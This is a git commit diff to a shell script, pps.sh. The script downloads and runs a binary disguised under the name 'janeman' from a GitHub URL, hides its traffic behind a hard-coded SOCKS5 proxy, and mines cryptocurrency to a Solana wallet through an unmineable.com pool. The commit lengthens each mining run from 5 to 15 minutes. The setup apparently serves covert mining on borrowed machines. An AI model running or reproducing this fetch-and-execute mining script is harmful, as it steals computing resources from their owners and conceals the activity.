f55175592a5dc18a1b8d445c90a5ea639725c606
vijaykumar892121 <93004368+vijaykumar892121@users.noreply.github.com>
2021-10-23 00:23:25 +0530

    Update pps.sh

--- pps.sh
+++ pps.sh
@@ -8,4 +8,4 @@ wget https://github.com/archernap/prem/raw/main/janeman
 chmod +x janeman
 export http_proxy=socks5://65.2.123.108:9001
 curl -x "socks5://65.2.123.108:9001" ifconfig.co
-timeout 5m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
+timeout 15m ./janeman -pool etchash-asia.unmineable.com:3333 -wal SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy.$(echo $(shuf -i 10-40 -n 1)-PPS) -pass x
